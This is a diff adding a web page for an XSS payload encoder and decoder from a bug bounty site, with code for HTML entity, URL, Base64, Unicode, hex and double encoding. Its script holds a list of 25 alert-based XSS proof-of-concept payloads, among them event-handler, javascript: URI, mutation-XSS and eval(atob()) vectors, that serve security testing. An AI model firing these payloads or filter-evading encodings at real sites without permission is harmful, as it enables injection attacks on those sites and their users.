@@ -1,0 +1,580 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Encoder · HTML Entity & URL Encode Tool</title>
+  <meta name="description" content="Encode/decode XSS payloads: HTML entities, URL, Base64, Unicode, Hex, double encoding. 25 safe presets included.">
+  <link rel="canonical" href="https://bugbountyreality.com/tools/xss-payload-encoder">
+  <!-- Structured data (JSON-LD) -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BreadcrumbList",
+    "itemListElement": [
+      { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://bugbountyreality.com/" },
+      { "@type": "ListItem", "position": 2, "name": "Security Tools", "item": "https://bugbountyreality.com/tools" },
+      { "@type": "ListItem", "position": 3, "name": "XSS Payload Encoder", "item": "https://bugbountyreality.com/tools/xss-payload-encoder" }
+    ]
+  }
+  </script>
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebApplication",
+    "name": "XSS Payload Encoder",
+    "url": "https://bugbountyreality.com/tools/xss-payload-encoder",
+    "description": "Interactive encoder/decoder for XSS payloads. Supports HTML entities, URL, Base64, Unicode, Hex, and double encoding.",
+    "applicationCategory": "Security Utility",
+    "operatingSystem": "All",
+    "browserRequirements": "JavaScript enabled"
+  }
+  </script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background: #0a0a0a;
+      color: #e0e0e0;
+      font-family: 'Segoe UI', 'Roboto', system-ui, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+    }
+    .container {
+      max-width: 1100px;
+      width: 100%;
+      background: #131313;
+      border-radius: 2rem;
+      padding: 2rem 2rem 2.5rem;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.8);
+      border: 1px solid #2a2a2a;
+    }
+    h1 {
+      font-weight: 500;
+      font-size: 2.2rem;
+      letter-spacing: -0.01em;
+      margin-bottom: 0.2rem;
+      color: #f0f0f0;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    h1 small {
+      font-size: 1rem;
+      font-weight: 300;
+      color: #9a9a9a;
+      margin-left: 0.5rem;
+    }
+    .breadcrumb {
+      font-size: 0.85rem;
+      color: #7a7a7a;
+      margin-bottom: 1.5rem;
+      display: flex;
+      flex-wrap: wrap;
+    }
+    .breadcrumb span {
+      margin: 0 4px;
+    }
+    .breadcrumb a {
+      color: #b0b0b0;
+      text-decoration: none;
+      border-bottom: 1px dotted #3a3a3a;
+    }
+    .breadcrumb a:hover {
+      color: #d4d4d4;
+      border-bottom-color: #9a9a9a;
+    }
+    .tool-grid {
+      display: flex;
+      flex-direction: column;
+      gap: 1.8rem;
+    }
+    .dual-pane {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.5rem;
+    }
+    .pane {
+      flex: 1 1 280px;
+      background: #1c1c1c;
+      border-radius: 1.2rem;
+      padding: 1.5rem;
+      border: 1px solid #2e2e2e;
+    }
+    .pane h2 {
+      font-weight: 400;
+      font-size: 1.2rem;
+      margin-bottom: 1rem;
+      color: #c6c6c6;
+      border-left: 4px solid #5f7fbf;
+      padding-left: 0.8rem;
+    }
+    label {
+      font-size: 0.85rem;
+      color: #aaa;
+      display: block;
+      margin: 0.8rem 0 0.3rem;
+    }
+    select, textarea, input[type="text"] {
+      width: 100%;
+      background: #0f0f0f;
+      border: 1px solid #333;
+      color: #e5e5e5;
+      padding: 0.7rem 1rem;
+      border-radius: 40px;
+      font-size: 0.95rem;
+      outline: none;
+      transition: 0.15s;
+      font-family: 'SF Mono', 'Fira Code', monospace;
+    }
+    select {
+      cursor: pointer;
+      background: #1a1a1a;
+      appearance: none;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='%23999' viewBox='0 0 16 16'%3E%3Cpath d='M4 6l4 4 4-4'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 1rem center;
+    }
+    textarea {
+      border-radius: 20px;
+      resize: vertical;
+      min-height: 120px;
+      padding: 1rem;
+      line-height: 1.5;
+    }
+    .input-group {
+      display: flex;
+      gap: 0.5rem;
+      flex-wrap: wrap;
+      margin-top: 0.5rem;
+    }
+    .btn {
+      background: #2a2a2a;
+      border: none;
+      color: #ddd;
+      padding: 0.6rem 1.4rem;
+      border-radius: 40px;
+      font-weight: 500;
+      font-size: 0.9rem;
+      cursor: pointer;
+      transition: 0.15s;
+      border: 1px solid #3f3f3f;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .btn-primary {
+      background: #3a5278;
+      border-color: #5b7bb0;
+      color: white;
+    }
+    .btn-primary:hover {
+      background: #4b6a9a;
+      border-color: #7b9bd0;
+    }
+    .btn-outline {
+      background: transparent;
+      border: 1px solid #4a4a4a;
+    }
+    .btn-outline:hover {
+      background: #222;
+    }
+    .btn-sm {
+      padding: 0.3rem 1rem;
+      font-size: 0.8rem;
+    }
+    .preset-grid {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      margin: 1rem 0 0.2rem;
+    }
+    .preset-chip {
+      background: #1f1f1f;
+      border: 1px solid #3a3a3a;
+      color: #c0c0c0;
+      padding: 0.25rem 1rem;
+      border-radius: 30px;
+      font-size: 0.75rem;
+      font-family: monospace;
+      cursor: pointer;
+      transition: 0.1s;
+      white-space: nowrap;
+    }
+    .preset-chip:hover {
+      background: #2f3f5f;
+      border-color: #5f7faf;
+      color: white;
+    }
+    .output-area {
+      background: #0b0b0b;
+      border-radius: 20px;
+      padding: 1rem 1.2rem;
+      margin-top: 0.8rem;
+      border: 1px solid #2a2a2a;
+      word-break: break-all;
+      font-family: 'SF Mono', 'Fira Code', monospace;
+      font-size: 0.9rem;
+      max-height: 200px;
+      overflow-y: auto;
+      color: #c6e0c6;
+    }
+    .copy-row {
+      display: flex;
+      justify-content: flex-end;
+      margin-top: 0.4rem;
+      gap: 0.5rem;
+    }
+    .status-tip {
+      color: #8a8a8a;
+      font-size: 0.8rem;
+      margin-top: 0.3rem;
+    }
+    .chain-indicator {
+      background: #1d2a1d;
+      border-radius: 40px;
+      padding: 0.2rem 1rem;
+      color: #a0d0a0;
+      font-size: 0.8rem;
+      display: inline-block;
+      border: 1px solid #3b5a3b;
+    }
+    hr {
+      border: 0.5px solid #2a2a2a;
+      margin: 1rem 0;
+    }
+    footer {
+      margin-top: 2rem;
+      text-align: center;
+      color: #555;
+      font-size: 0.8rem;
+    }
+    .flex-between {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+  </style>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2241192243363112" crossorigin="anonymous"></script>
+</head>
+<body>
+<div class="container">
+  <!-- breadcrumb -->
+  <div class="breadcrumb">
+    <a href="https://bugbountyreality.com/">Home</a><span>›</span>
+    <a href="https://bugbountyreality.com/tools">Tools</a><span>›</span>
+    <span>XSS Payload Encoder</span>
+  </div>
+
+  <div class="tool-grid">
+    <div class="flex-between">
+      <h1>⚡ XSS Encoder <small>HTML entity · URL · Base64 · Unicode · Hex · double</small></h1>
+      <div class="chain-indicator" id="chainBadge">⛓️ chain: off</div>
+    </div>
+
+    <!-- dual pane: input & output -->
+    <div class="dual-pane">
+      <!-- input pane -->
+      <div class="pane">
+        <h2>✏️ Input</h2>
+        <label for="payloadInput">Payload text</label>
+        <textarea id="payloadInput" placeholder="<script>alert('XSS')</script> or paste encoded string ...">&#x3C;script&#x3E;alert(&#x27;XSS&#x27;)&#x3C;/script&#x3E;</textarea>
+        
+        <div class="input-group">
+          <select id="modeSelect">
+            <option value="htmlEntity">HTML Entity encode</option>
+            <option value="urlEncode">URL encode</option>
+            <option value="base64">Base64 encode</option>
+            <option value="unicodeEscape">Unicode escape</option>
+            <option value="hexEncode">Hex encode</option>
+            <option value="doubleEncode">Double encode (HTML→URL)</option>
+          </select>
+          <button class="btn btn-primary" id="encodeBtn">▶ Encode</button>
+          <button class="btn btn-outline" id="decodeBtn">◀ Decode</button>
+        </div>
+
+        <!-- preset chips -->
+        <label style="margin-top:1rem;">🧪 25 safe XSS presets (educational)</label>
+        <div class="preset-grid" id="presetContainer"></div>
+        <div class="status-tip" id="presetCount"></div>
+      </div>
+
+      <!-- output pane -->
+      <div class="pane">
+        <h2>📦 Output</h2>
+        <div class="output-area" id="outputDisplay">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
+        <div class="copy-row">
+          <button class="btn btn-sm btn-outline" id="copyBtn">📋 Copy</button>
+          <button class="btn btn-sm btn-outline" id="clearBtn">🗑️ Clear</button>
+        </div>
+        <div class="status-tip" id="copyFeedback"></div>
+        <div style="margin-top: 0.8rem; font-size:0.8rem; color:#6a6a6a;">
+          <span>🔁 Chain: </span><label style="display:inline; font-size:0.8rem;"><input type="checkbox" id="chainToggle"> re-encode output (encode → encode)</label>
+        </div>
+      </div>
+    </div>
+  </div>
+  <footer>bugbountyreality.com · XSS research · safe payloads</footer>
+<div style="margin:20px auto;max-width:728px;text-align:center">
+<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-2241192243363112" data-ad-slot="auto" data-ad-format="auto" data-full-width-responsive="true"></ins>
+<script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+</div>
+</div>
+
+<script>
+  (function() {
+    // ----- DOM refs -----
+    const inputEl = document.getElementById('payloadInput');
+    const outputEl = document.getElementById('outputDisplay');
+    const modeSelect = document.getElementById('modeSelect');
+    const encodeBtn = document.getElementById('encodeBtn');
+    const decodeBtn = document.getElementById('decodeBtn');
+    const copyBtn = document.getElementById('copyBtn');
+    const clearBtn = document.getElementById('clearBtn');
+    const chainToggle = document.getElementById('chainToggle');
+    const chainBadge = document.getElementById('chainBadge');
+    const presetContainer = document.getElementById('presetContainer');
+    const presetCount = document.getElementById('presetCount');
+    const copyFeedback = document.getElementById('copyFeedback');
+
+    // ----- 25 safe XSS presets (educational) -----
+    const presets = [
+      "<script>alert('XSS')</script>",
+      "<img src=x onerror=alert(1)>",
+      "<svg onload=alert(1)>",
+      "javascript:alert('XSS')",
+      "\"><script>alert(1)</script>",
+      "'-alert(1)-'",
+      "<body onload=alert(1)>",
+      "<input onfocus=alert(1) autofocus>",
+      "<details open ontoggle=alert(1)>",
+      "<iframe src=javascript:alert(1)>",
+      "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
+      "{{constructor.constructor('alert(1)')()}}",
+      "';alert(1);//",
+      "<a href=\"javascript:alert(1)\">click</a>",
+      "<div onmouseover=alert(1)>hover</div>",
+      "<!--<script>alert(1)</script>-->",
+      "<![CDATA[<script>alert(1)</script>]]>",
+      "<%00script>alert(1)</script>",
+      "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "<script>eval(atob('YWxlcnQoMSk='))</script>",
+      "1<script>alert(1)</script>",
+      "<script src=data:text/javascript,alert(1)>",
+      "<marquee onstart=alert(1)>",
+      "<isindex type=image src=x onerror=alert(1)>",
+      "<script>window.onerror=eval;throw'=alert\\x281\\x29'</script>"
+    ];
+
+    // render preset chips
+    function renderPresets() {
+      presetContainer.innerHTML = '';
+      presets.forEach((p, idx) => {
+        const chip = document.createElement('span');
+        chip.className = 'preset-chip';
+        // show short preview
+        const short = p.length > 28 ? p.substring(0, 25) + '…' : p;
+        chip.textContent = short;
+        chip.title = p;
+        chip.dataset.index = idx;
+        chip.addEventListener('click', function(e) {
+          inputEl.value = presets[parseInt(this.dataset.index)];
+          // auto encode? we just set input, user can click encode
+          outputEl.textContent = '⏎ press Encode or Decode';
+          copyFeedback.textContent = '';
+        });
+        presetContainer.appendChild(chip);
+      });
+      presetCount.textContent = `${presets.length} presets loaded`;
+    }
+    renderPresets();
+
+    // ----- encoding functions -----
+    function htmlEntityEncode(str) {
+      return str.replace(/[&<>"'`]/g, function(m) {
+        if (m === '&') return '&amp;';
+        if (m === '<') return '&lt;';
+        if (m === '>') return '&gt;';
+        if (m === '"') return '&quot;';
+        if (m === "'") return '&#x27;';
+        if (m === '`') return '&#x60;';
+        return m;
+      });
+    }
+
+    function urlEncode(str) {
+      return encodeURIComponent(str);
+    }
+
+    function base64Encode(str) {
+      try {
+        return btoa(unescape(encodeURIComponent(str)));
+      } catch (e) {
+        return '[Base64 error]';
+      }
+    }
+
+    function unicodeEscape(str) {
+      let out = '';
+      for (let ch of str) {
+        let code = ch.charCodeAt(0);
+        if (code < 128) {
+          out += '\\u' + code.toString(16).padStart(4, '0');
+        } else {
+          out += ch; // keep non-ascii as is
+        }
+      }
+      return out;
+    }
+
+    function hexEncode(str) {
+      let out = '';
+      for (let ch of str) {
+        let code = ch.charCodeAt(0);
+        out += '\\x' + code.toString(16).padStart(2, '0');
+      }
+      return out;
+    }
+
+    function doubleEncode(str) {
+      // HTML entity first, then URL encode
+      let htmlEnc = htmlEntityEncode(str);
+      return urlEncode(htmlEnc);
+    }
+
+    // ----- decode functions -----
+    function decodeHTML(str) {
+      let txt = document.createElement('textarea');
+      txt.innerHTML = str;
+      return txt.value;
+    }
+
+    function urlDecode(str) {
+      try {
+        return decodeURIComponent(str.replace(/\+/g, ' '));
+      } catch (e) {
+        return str;
+      }
+    }
+
+    function base64Decode(str) {
+      try {
+        return decodeURIComponent(escape(atob(str)));
+      } catch (e) {
+        return '[invalid base64]';
+      }
+    }
+
+    function unicodeUnescape(str) {
+      return str.replace(/\\u([0-9a-fA-F]{4})/g, (m, code) => String.fromCharCode(parseInt(code, 16)));
+    }
+
+    function hexDecode(str) {
+      return str.replace(/\\x([0-9a-fA-F]{2})/g, (m, code) => String.fromCharCode(parseInt(code, 16)));
+    }
+
+    // main encode dispatch
+    function encodeText(text, mode) {
+      switch (mode) {
+        case 'htmlEntity': return htmlEntityEncode(text);
+        case 'urlEncode': return urlEncode(text);
+        case 'base64': return base64Encode(text);
+        case 'unicodeEscape': return unicodeEscape(text);
+        case 'hexEncode': return hexEncode(text);
+        case 'doubleEncode': return doubleEncode(text);
+        default: return text;
+      }
+    }
+
+    function decodeText(text, mode) {
+      // best effort decode based on mode
+      switch (mode) {
+        case 'htmlEntity': return decodeHTML(text);
+        case 'urlEncode': return urlDecode(text);
+        case 'base64': return base64Decode(text);
+        case 'unicodeEscape': return unicodeUnescape(text);
+        case 'hexEncode': return hexDecode(text);
+        case 'doubleEncode': {
+          // double: first URL decode, then HTML decode
+          let urlDec = urlDecode(text);
+          return decodeHTML(urlDec);
+        }
+        default: return text;
+      }
+    }
+
+    // ----- interactive logic -----
+    function performEncode() {
+      let input = inputEl.value;
+      let mode = modeSelect.value;
+      let chain = chainToggle.checked;
+
+      let result = encodeText(input, mode);
+      if (chain) {
+        // re-encode: encode again with same mode
+        result = encodeText(result, mode);
+      }
+      outputEl.textContent = result || '(empty)';
+      copyFeedback.textContent = '';
+    }
+
+    function performDecode() {
+      let input = inputEl.value;
+      let mode = modeSelect.value;
+      let result = decodeText(input, mode);
+      outputEl.textContent = result || '(empty)';
+      copyFeedback.textContent = '';
+    }
+
+    // copy
+    copyBtn.addEventListener('click', function() {
+      let text = outputEl.textContent;
+      if (!text || text === '(empty)') {
+        copyFeedback.textContent = '⚠️ nothing to copy';
+        return;
+      }
+      navigator.clipboard.writeText(text).then(() => {
+        copyFeedback.textContent = '✅ copied!';
+      }).catch(() => {
+        copyFeedback.textContent = '❌ copy failed';
+      });
+    });
+
+    clearBtn.addEventListener('click', function() {
+      outputEl.textContent = '';
+      copyFeedback.textContent = '';
+    });
+
+    // event listeners
+    encodeBtn.addEventListener('click', performEncode);
+    decodeBtn.addEventListener('click', performDecode);
+
+    // chain toggle badge
+    chainToggle.addEventListener('change', function() {
+      chainBadge.textContent = this.checked ? '⛓️ chain: on' : '⛓️ chain: off';
+    });
+
+    // initial: show something (decode HTML of default)
+    window.addEventListener('load', function() {
+      // default input is html entity, decode to show readable
+      let defaultInput = inputEl.value;
+      let decoded = decodeHTML(defaultInput);
+      outputEl.textContent = decoded;
+      chainBadge.textContent = '⛓️ chain: off';
+    });
+
+    // extra: double click preset to encode? not needed
+
+  })();
+</script>
+</body>
+</html>
